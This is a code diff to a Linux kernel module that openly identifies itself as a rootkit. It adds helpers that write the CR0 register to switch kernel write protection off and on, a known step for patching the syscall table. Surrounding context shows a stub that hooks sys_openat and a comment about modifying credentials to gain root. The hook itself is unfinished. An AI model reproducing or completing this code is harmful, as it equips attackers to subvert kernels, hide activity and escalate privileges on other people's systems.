@@ -3,6 +3,7 @@
 #include <linux/init.h>
 #include <linux/fs.h>
 #include <linux/device.h>
+#include <linux/slab.h>
 #include "rootkit.h"
 
 // 自己写的sys_openat函数
@@ -10,6 +11,40 @@
 static long my_sys_openat(const struct pt_regs *regs)
 {
     //todo
+}
+
+inline void mywrite_cr0(unsigned long cr0)
+{
+    asm volatile("mov %0,%%cr0"
+                 : "+r"(cr0), "+m"(__force_order));
+}
+
+void enable_wp(void)
+{
+    // 可能存在条件竞争
+    unsigned long cr0;
+
+    preempt_disable();
+    cr0 = read_cr0();
+    set_bit(X86_CR0_WP_BIT, &cr0);
+    mywrite_cr0(cr0);
+    preempt_enable();
+
+    return;
+}
+
+void disable_wp(void)
+{
+    // 可能存在条件竞争
+    unsigned long cr0;
+
+    preempt_disable();
+    cr0 = read_cr0();
+    clear_bit(X86_CR0_WP_BIT, &cr0);
+    mywrite_cr0(cr0);
+    preempt_enable();
+
+    return;
 }
 
 // 修改cred获得root权限
